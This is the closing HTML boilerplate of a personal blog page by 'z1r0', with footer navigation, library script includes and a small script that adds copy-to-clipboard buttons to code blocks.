        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright ©
    
    
    2021-2024
    z1r0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->



<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>